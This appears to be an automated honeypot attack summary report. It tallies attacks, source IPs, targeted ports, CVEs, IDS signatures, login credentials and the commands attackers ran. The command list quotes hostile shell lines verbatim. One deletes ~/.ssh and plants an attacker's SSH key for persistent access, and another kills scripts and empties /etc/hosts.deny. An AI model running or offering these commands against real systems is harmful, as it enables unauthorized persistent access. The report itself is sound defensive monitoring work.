Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-16T03:01:23Z
**Timeframe:** 2025-10-16T02:20:01Z to 2025-10-16T03:00:01Z
**Files Used:**
- agg_log_20251016T022001Z.json
- agg_log_20251016T024002Z.json
- agg_log_20251016T030001Z.json

### Executive Summary
This report summarizes honeypot activity over a period of approximately 40 minutes, analyzing data from three log files. A total of 19,588 attacks were recorded. The most targeted services were Cowrie (SSH), Sentrypeer (VoIP), and Honeytrap. The top attacking IP address was 103.106.219.216. A significant number of attacks targeted port 5060 (SIP) and port 445 (SMB). Several CVEs were identified, with CVE-2002-0013 and CVE-2002-0012 being the most frequent. Attackers attempted a variety of commands, primarily focused on reconnaissance and establishing persistent access.

### Detailed Analysis

**Attacks by Honeypot:**
- **Cowrie:** 6,612
- **Sentrypeer:** 3,612
- **Honeytrap:** 3,310
- **Suricata:** 2,073
- **Dionaea:** 2,028
- **Ciscoasa:** 1,696
- **Mailoney:** 71
- **H0neytr4p:** 40
- **Miniprint:** 39
- **Tanner:** 32
- **ConPot:** 31
- **Honeyaml:** 17
- **Redishoneypot:** 15
- **Dicompot:** 9
- **ElasticPot:** 3

**Top Attacking IPs:**
- 103.106.219.216
- 185.243.5.121
- 23.94.26.58
- 20.2.136.52
- 172.86.95.115
- 172.86.95.98
- 107.172.76.10
- 156.232.11.142
- 12.189.234.27
- 62.141.43.183

**Top Targeted Ports/Protocols:**
- 5060
- 445
- 22
- TCP/5900
- 5903
- 8333
- 5901
- UDP/5060
- 25
- 23

**Most Common CVEs:**
- CVE-1999-0183
- CVE-2002-0012
- CVE-2002-0013
- CVE-1999-0517
- CVE-2019-11500
- CVE-2021-3449

**Commands Attempted by Attackers:**
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cat /proc/cpuinfo | grep name | wc -l`
- `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `ls -lh $(which ls)`
- `which ls`
- `crontab -l`
- `w`
- `uname -m`
- `cat /proc/cpuinfo | grep model | grep name | wc -l`
- `top`
- `uname`
- `uname -a`
- `whoami`
- `lscpu | grep Model`
- `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
- `Enter new UNIX password:`
- `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`

**Signatures Triggered:**
- ET DROP Dshield Block Listed Source group 1
- 2402000
- ET DROP Spamhaus DROP Listed Traffic Inbound group 42
- 2400041
- ET SCAN NMAP -sS window 1024
- 2009582
- ET DROP Spamhaus DROP Listed Traffic Inbound group 41
- 2400040
- ET INFO Reserved Internal IP Traffic
- 2002752

**Users / Login Attempts:**
- 345gs5662d34/345gs5662d34
- root/3245gs5662d34
- root/123@@@
- root/Qaz123qaz
- welcome/
- users/
- site/
- debian/8888
- ftpuser/ftppassword
- unknown/4444

**Files Uploaded/Downloaded:**
- $(echo
- shadow.mpsl
- $(wget
- $(busybox
- shadow.mips

**HTTP User-Agents:**
- No user agents were reported in this timeframe.

**SSH Clients:**
- No SSH clients were reported in this timeframe.

**SSH Servers:**
- No SSH servers were reported in this timeframe.

**Top Attacker AS Organizations:**
- No AS organizations were reported in this timeframe.

### Key Observations and Anomalies
- A large number of commands executed are related to gathering system information and attempting to add an SSH key to the `authorized_keys` file for persistent access.
- The high volume of traffic to port 5060 suggests a focus on VoIP-related vulnerabilities.
- The presence of commands like `pkill -9 secure.sh` and `pkill -9 auth.sh` suggests that attackers are attempting to remove other malware or security scripts from compromised systems.
- The variety of CVEs targeted indicates that attackers are using a broad set of exploits to maximize their chances of success.
- The repeated use of the same SSH key in the `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."` command across multiple attacks indicates a coordinated campaign.